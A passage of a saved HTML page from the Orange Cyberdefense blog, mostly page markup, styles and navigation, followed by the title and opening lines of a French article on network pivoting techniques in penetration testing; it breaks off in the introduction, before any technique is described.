<!DOCTYPE html>
<html class="js bg-white " prefix="og: http://ogp.me/ns#" lang="fr-FR"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="profile" href="https://gmpg.org/xfn/11">
    <link rel="preload" href="https://cyberdefense.orange.com/wp-content/themes/boosted-child/dist/fonts/HelvNeue55_W1G.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="https://cyberdefense.orange.com/wp-content/themes/boosted-child/dist/fonts/HelvNeue75_W1G.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="https://cyberdefense.orange.com/wp-content/themes/boosted-child/dist/fonts/boosted-icons.woff2" as="font" type="font/woff2" crossorigin="">
            <link rel="pingback" href="">
    <script type="text/javascript" async="" charset="utf-8" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/analytics.js" id="tealium-tag-7110"></script><script src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/utag.js" type="text/javascript" async=""></script><script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<link rel="icon" href="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png" sizes="32x32">
<link rel="icon" href="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png" sizes="192x192">
<link rel="apple-touch-icon-precomposed" href="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png">
<meta name="msapplication-TileImage" content="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png">
<title>Etat de l’art du pivoting réseau en 2019 | Orange Cyberdefense</title>
<meta name="dc.title" content="Etat de l’art du pivoting réseau en 2019 | Orange Cyberdefense">
<meta name="dc.description" content="Le pivoting, consiste à utiliser une machine contrôlée par l’attaquant comme d’un rebond, visant ainsi à augmenter la visibilité du réseau. Découverte des techniques de pivoting utilisées dans le cadre d’un pentest. ">
<meta name="dc.relation" content="https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/">
<meta name="dc.source" content="https://cyberdefense.orange.com/">
<meta name="dc.language" content="fr_FR">
<meta name="description" content="Le pivoting, consiste à utiliser une machine contrôlée par l’attaquant comme d’un rebond, visant ainsi à augmenter la visibilité du réseau. Découverte des techniques de pivoting utilisées dans le cadre d’un pentest. ">
<link rel="canonical" href="https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/">
<script type="application/ld+json">{"@context" : "https://schema.org","@type" : "Organization","name" : "Cyberdefense","url" : "https:\/\/cyberdefense.orange.com"}</script>
<meta property="og:url" content="https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/">
<meta property="og:site_name" content="Cyberdefense">
<meta property="og:locale" content="fr_FR">
<meta property="og:type" content="article">
<meta property="og:title" content="Etat de l’art du pivoting réseau en 2019 | Orange Cyberdefense">
<meta property="og:description" content="Le pivoting, consiste à utiliser une machine contrôlée par l’attaquant comme d’un rebond, visant ainsi à augmenter la visibilité du réseau. Découverte des techniques de pivoting utilisées dans le cadre d’un pentest. ">
<meta property="og:image" content="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_pivoting.png">
<meta property="og:image:secure_url" content="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_pivoting.png">
<meta property="og:image:width" content="1716">
<meta property="og:image:height" content="602">
<meta property="og:image:alt" content="Le pivoting dans le pentest avec Orange Cyberdefense">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Etat de l’art du pivoting réseau en 2019 | Orange Cyberdefense">
<meta name="twitter:description" content="Le pivoting, consiste à utiliser une machine contrôlée par l’attaquant comme d’un rebond, visant ainsi à augmenter la visibilité du réseau. Découverte des techniques de pivoting utilisées dans le cadre d’un pentest. ">
<meta name="twitter:image" content="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_pivoting-150x53.png">
<link rel="dns-prefetch" href="https://s.w.org/">
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/cyberdefense.orange.com\/wp-includes\/js\/wp-emoji-release.min.js"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="css-css" href="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/boosted.css" type="text/css" media="all">
<style id="css-inline-css" type="text/css">

        body,
        .elementor-page main::after,
        .archive.elementor-default main::after {
            background-color: #020202 !important;
        }

        #background {
            background-color: #050505 !important;
        }

        #background video,
        #background::after {
            opacity: 0.6 !important;
        }
            @media screen and (min-width: 980px) {
                body::after {
                    background-image: linear-gradient(to bottom,
                        transparent 0%, transparent 31.25rem,
                        #020202 31.25rem, #020202 100%) !important;
                }

                
            }

            @media screen and (max-width: 767px) {
                #background {
                    height: 10rem !important;
                }
            }

            @media screen and (min-width: 768px) and (max-width: 1219px) {
                #background {
                    height: calc(31.25rem + 130px + 1rem) !important;
                }
            }

            @media screen and (min-width: 1220px) and (max-width: 1379px) {
                #background {
                    height: 31.25rem !important;
                }
            }

            @media screen and (min-width: 1380px) {
                #background {
                    height: 31.25rem !important;
                }
            }
            @media screen and (max-width: 767px) {
                #background::after {
                    background-image: url('https://cyberdefense.orange.com/wp-content/uploads/sites/9/2018/08/pix.png') !important;
                }
            }

            @media screen and (min-width: 768px) and (max-width: 1219px) {
                #background::after {
                    background-image: url('https://cyberdefense.orange.com/wp-content/uploads/sites/9/2018/08/pix.png') !important;
                }
            }

            @media screen and (min-width: 1220px) and (max-width: 1379px) {
                #background::after {
                    background-image: url('https://cyberdefense.orange.com/wp-content/uploads/sites/9/2018/08/pix.png') !important;
                }
            }

            @media screen and (min-width: 1380px) {
                #background::after {
                    background-image: url('https://cyberdefense.orange.com/wp-content/uploads/sites/9/2018/08/pix.png') !important;
                }
            }
            main {
                margin-top: 10rem !important;
            }

            .jumbotron {
                height: 10rem !important;
            }

            @media screen and (min-width: 768px) {
                main {
                    margin-top: 31.25rem !important;
                }

                .jumbotron {
                    height: 31.25rem !important;
                }
            }

            @media screen and (min-width: 1220px) {
                main {
                    margin-top: calc(31.25rem - 130px - 4.25rem) !important;
                }

                .jumbotron {
                    height: calc(31.25rem - 130px - 4.25rem) !important;
                }
            }
</style>
<link rel="stylesheet" id="elementor-frontend-css" href="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/frontend.css" type="text/css" media="all">
<style id="elementor-frontend-inline-css" type="text/css">
.elementor-lightbox{background-color:#020202;}
.elementor-177416 .elementor-element.elementor-element-4c80354{text-align:left;}.elementor-177416 .elementor-element.elementor-element-8fe55ee > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-1e4c694 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-49af45b > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-14e0b8d > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-bf48b31 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-4cb1695 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-4284bb7 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-7cb04e3 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-4cc203b > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-069d1b7 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-c669c67 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-d4cc231 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-b51251d > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-e683985 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-4d17d7d > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-77d7cab > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-140c48a > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-b1c053a > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-82980c3 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-a19bf27 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-824bdea > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-8780cb4 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-acbbdac > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-15e5b11 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-ed3225e > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-4776702 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-2042f5c > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-23cc094 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-d9f70c4 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-72b5643 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-6368553 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-7d7aa32 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-d77180c > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-2134373 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-2d1ef6f > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-f9b891a > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-0d05bf1 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-2ad9b2e > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-6ae056c > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-3566a10 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-fdebcc3 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-bf11748 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-94eb0ea > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-8af8007 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-b1d9cfd > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-f4fa92b > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-2221210 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-c79d895{color:#474747;}.elementor-177416 .elementor-element.elementor-element-c79d895 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-95d491a > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-ed23abc > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-708c751 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-4e664f1 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-ca1759a > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-8072555 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-37d435a > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-7f7e5c1 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-eb90688 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-6a4c9fd > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-05c2bdd > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-8d8aba7 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-30227e4 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-a3bc106 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-0771672 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-6e76506 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-a17b70a > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-140bcea > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-5f42931 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-e2390af > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-a630041 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-37d70dd > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-7ab0f45 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-5e15674 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-d81e035 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-232fffe > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-c4faf9e > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-6be07de > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-cbe43d1 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-f5bfee6 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-5316a02 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-2b84143 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-78a1024 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-bc9e352 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-6cf9428 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-70ea9ba > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-af90152 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-f6d277b > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-5f792f1 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-10950ff > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-0fd8d24 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-abbdcf0 > .elementor-widget-container{background-color:#474747;}.elementor-177416 .elementor-element.elementor-element-a4b7a20 > .elementor-widget-container{background-color:#474747;}
</style>
<link rel="stylesheet" id="elementor-pro-css" href="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/frontend_002.css" type="text/css" media="all">
<link rel="stylesheet" id="osm-styles-css" href="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/leaflet.css" type="text/css" media="all">
<style id="osm-styles-inline-css" type="text/css">
.openstreetmap{contain:content}
</style>
<link rel="https://api.w.org/" href="https://cyberdefense.orange.com/wp-json/">
<link rel="alternate" type="application/json+oembed" href="https://cyberdefense.orange.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcyberdefense.orange.com%2Ffr%2Fblog%2Fetat-de-lart-du-pivoting-reseau-en-2019%2F">
<link rel="alternate" type="text/xml+oembed" href="https://cyberdefense.orange.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcyberdefense.orange.com%2Ffr%2Fblog%2Fetat-de-lart-du-pivoting-reseau-en-2019%2F&amp;format=xml">
<link rel="alternate" type="application/rss+xml" title="Cyberdefense » Le Blog Orange Cyberdefense Feed" href="https://cyberdefense.orange.com/fr/blog/feed/"><link rel="alternate" type="application/rss+xml" title="Cyberdefense » Événements Feed" href="https://cyberdefense.orange.com/cops_event/feed/">		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		<link rel="shortcut icon" type="image/x-icon" href="https://cyberdefense.orange.com/wp-content/themes/boosted-child/favicon.ico"><style>#wpadminbar #wp-admin-bar-site-name>.ab-item:before { content: none !important;}li#wp-admin-bar-site-name a { background: url( "https://cyberdefense.orange.com/wp-content/themes/boosted-child/favicon.ico" ) left center/20px no-repeat !important; padding-left: 21px !important; background-size: 20px !important; } li#wp-admin-bar-site-name { margin-left: 5px !important; } li#wp-admin-bar-site-name {} #wp-admin-bar-site-name div a { background: none !important; }
</style><link rel="icon" href="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png" sizes="32x32">
<link rel="icon" href="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png" sizes="192x192">
<link rel="apple-touch-icon-precomposed" href="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png">
<meta name="msapplication-TileImage" content="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/01/small_logo_rgb_32x32.png">
<script type="text/javascript" async="" charset="utf-8" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/utag_002.js" id="utag_orange.corp_45"></script><script type="text/javascript" async="" charset="utf-8" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/utag_003.js" id="tiqapp"></script></head>
<body class="blog-template-default single single-blog postid-177416 bg-body elementor-default elementor-page elementor-page-177416 navbar-minimized" itemscope="" itemtype="https://schema.org/WebPage" data-elementor-device-mode="desktop">
<div id="background"></div>

<header role="banner" id="sticky-nav">
    <div class="container">
        <a href="#main" id="skippy" class="sr-only sr-only-focusable">
            <span class="skiplink-text">Aller au contenu principal</span>
        </a>
    </div>

            <nav class="navbar navbar-expand-md supra d-none d-lg-flex border-0 navbar-dark " role="navigation">
            <div class="container">

                                    <ul class="navbar-nav ml-auto navbar-social flex-row" aria-hidden="true"><li class="nav-item"><a target="_blank" rel="noopener noreferrer" title="Orange Cyberdefense sur Twitter (ouvre un nouvel onglet)" href="https://twitter.com/orangecyberdef" class="nav-link" tabindex="-1">Orange Cyberdefense sur Twitter</a></li><li class="nav-item"><a target="_blank" rel="noopener noreferrer" title="Orange Cyberdefense sur LinkedIn (ouvre un nouvel onglet)" href="https://fr.linkedin.com/company/orange-cyberdefense" class="nav-link" tabindex="-1">Orange Cyberdefense sur LinkedIn</a></li></ul>            </div>
        </nav>
    
    <nav id="nav" class="navbar navbar-expand-lg bg-white minimized" role="navigation">
        <div class="container bg-white">
            <a href="https://cyberdefense.orange.com/fr/" class="navbar-brand logo pb-0 pl-1 pl-lg-0 ml-2 ml-lg-0 mt-3 mt-lg-0 mb-1 mb-lg-0 d-flex align-items-end" rel="home" itemprop="url"><img alt="" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/orange_logo.svg" itemprop="logo" class="d-block mb-0" width="50" height="50"><strong itemprop="name" class="h2 mb-0 ml-3 mr-2 d-block">Cyberdefense</strong></a>
            <ul class="navbar-nav flex-row justify-content-between align-items-center justify-content-lg-end align-items-lg-end ml-sm-auto">
                                    <li class="nav-item bg-hidden-md-up">
                        <button class="nav-link btn btn-link icon navbar-toggler mb-0 ml-2 border-0 position-relative  collapsed" type="button" data-toggle="collapse" data-target="#collapsible-nav" aria-controls="collapsible-nav" aria-expanded="false">
                            <span class="sr-only">Basculer la navigation</span>
                            <span class="bun d-inline-block" aria-hidden="true">
                                <span class="bacon radius"></span>
                            </span>
                        </button>
                        <div id="collapsible-nav" class="navbar-collapse collapse justify-content-end"><ul class="navbar-nav flex-wrap"><li class="dropdown nav-item"><button class="btn btn-link nav-link border-0 dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" type="button" id="dropdown-a-propos">A propos</button>
<div class="dropdown-menu" aria-labelledby="dropdown-a-propos" role="menu">
<a href="https://cyberdefense.orange.com/fr/qui-sommes-nous/" class="dropdown-item" role="menuitem">Qui sommes-nous ?</a><a href="https://cyberdefense.orange.com/fr/nos-certifications/" class="dropdown-item" role="menuitem">Certifications</a><a href="https://cyberdefense.orange.com/fr/nos-actualites/" class="dropdown-item" role="menuitem">Actualités</a><a href="https://cyberdefense.orange.com/cops_event/" class="dropdown-item" role="menuitem">Evénements</a></div></li><li class="dropdown nav-item"><button class="btn btn-link nav-link border-0 dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" type="button" id="dropdown-nos-expertises">Nos expertises</button>
<div class="dropdown-menu" aria-labelledby="dropdown-nos-expertises" role="menu">
<a href="https://cyberdefense.orange.com/fr/nos-expertises/" class="dropdown-item" role="menuitem">Nos expertises</a><a href="https://cyberdefense.orange.com/fr/nos-expertises/solutions-de-confiance/" class="dropdown-item" role="menuitem">Solutions de confiance</a><a href="https://cyberdefense.orange.com/fr/nos-expertises/conseil-audit/" class="dropdown-item" role="menuitem">Conseil &amp; Audit</a><a href="https://cyberdefense.orange.com/fr/nos-expertises/controle-surveillance-reaction/" class="dropdown-item" role="menuitem">Contrôle, Surveillance, Réaction</a><a href="https://cyberdefense.orange.com/fr/nos-expertises/cybersecurity-training-center/" class="dropdown-item" role="menuitem">Cybersecurity Training Center</a></div></li><li class="dropdown nav-item"><button class="btn btn-link nav-link border-0 dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" type="button" id="dropdown-nous-rejoindre">Nous rejoindre</button>
<div class="dropdown-menu" aria-labelledby="dropdown-nous-rejoindre" role="menu">
<a href="https://cyberdefense.orange.com/fr/pourquoi-nous-rejoindre/" class="dropdown-item" role="menuitem">Pourquoi nous rejoindre ?</a><a href="https://cyberdefense.orange.com/fr/pourquoi-nous-rejoindre/nos-offres-demploi/" class="dropdown-item" role="menuitem">Nos offres d’emploi</a><a href="https://cyberdefense.orange.com/fr/pourquoi-nous-rejoindre/orange-cyberdefense-academy/" class="dropdown-item" role="menuitem">Orange Cyberdefense Academy</a><a href="https://cyberdefense.orange.com/fr/pourquoi-nous-rejoindre/relations-ecoles-universites/" class="dropdown-item" role="menuitem">Relations écoles &amp; universités</a></div></li><li class="nav-item"><a href="https://cyberdefense.orange.com/fr/blog/" class="nav-link">Le Blog</a></li><li class="nav-item"><a href="https://cyberdefense.orange.com/fr/accueil/contactez-nous/" class="nav-link">Nous contacter</a></li></ul></div>                    </li>
                                <li class="nav-item ml-auto ml-lg-0 ">
                    <button type="button" class="nav-link btn btn-link icon mb-0  collapsed" data-toggle="collapse" data-target="#collapsible-search" aria-expanded="false" aria-controls="collapsible-search">
                        <span class="sr-only">Ouvrir la barre de recherche</span>
                        <span class="icon-search" aria-hidden="true"></span>
                    </button>
                </li>
                            </ul>

                    </div>
    </nav><!-- / #nav -->

    
    <div class="collapse search-bar bg-lightest" id="collapsible-search">
        <div class="container py-4">
            <form role="search" method="get" action="https://cyberdefense.orange.com/fr/" class="d-flex flex-row flex-nowrap">
    <label for="s" class="sr-only">Recherche</label>
    <input id="s" type="search" name="s" placeholder="Recherche" class="form-control border-0">
    <button type="submit" name="submit" class="btn btn-inverse btn-primary pull-md-right">
        <span class="sr-only">Rechercher</span>
        <span class="icon-search" aria-hidden="true"></span>
    </button>
</form>
        </div>
    </div>
</header><!-- / banner -->


<main id="main" role="main" itemprop="mainContentOfPage" tabindex="-1" class="container bg-white mb-md-5 pb-3 px-lg-5">
    <nav aria-label="Vous êtes ici&nbsp;: "><ol class="breadcrumb mb-lg-0 pl-lg-0 pt-lg-3" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumb-item"><a href="https://cyberdefense.orange.com/fr" itemprop="item"><span itemprop="name">Cyberdefense</span></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumb-item"><a href="https://cyberdefense.orange.com/fr/blog/" itemprop="item" title="Le Blog Orange Cyberdefense"><span itemprop="name">Le Blog Orange Cyberdefense</span></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumb-item active"><span itemprop="name">Etat de l’art du pivoting réseau en 2019</span></li></ol></nav>
        <article role="article" itemscope="" itemtype="https://schema.org/Article" class="post-177416 blog type-blog status-publish has-post-thumbnail hentry themes-ethical_hacking">
            <div class="jumbotron py-0 px-md-5 m-0 d-flex flex-column justify-content-center align-items-start"><h1 class="display-2 mw-100" itemprop="name">Etat de l’art du pivoting réseau en 2019</h1></div><!-- /.jumbotron --><hr class="my-2 d-none d-lg-block">
            <div itemprop="articleBody" class="px-1 px-md-0">
                		<div data-elementor-type="wp-post" data-elementor-id="177416" class="elementor elementor-177416" data-elementor-settings="[]">
			<div class="elementor-inner">
				<div class="elementor-section-wrap">
							<section class="elementor-element elementor-element-353797c elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="353797c" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div class="elementor-element elementor-element-e05667b elementor-column elementor-col-100 elementor-top-column" data-id="e05667b" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div class="elementor-element elementor-element-884a7d2 elementor-widget elementor-widget-heading" data-id="884a7d2" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-medium">Alexandre 
Zanni, pentester chez Orange Cyberdefense, met en lumière dans cet 
article plusieurs techniques de pivoting utilisées dans le cadre d’un 
pentest. </h2>		</div>
				</div>
				<div class="elementor-element elementor-element-fdedbec elementor-widget elementor-widget-heading" data-id="fdedbec" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Introduction : qu’est-ce qu’un pivoting ?</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-d17ecfa elementor-widget elementor-widget-text-editor" data-id="d17ecfa" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Les 
pentesters sont souvent amenés à passer les frontières des réseaux afin 
d’accéder aux infrastructures critiques des clients. Un scénario commun 
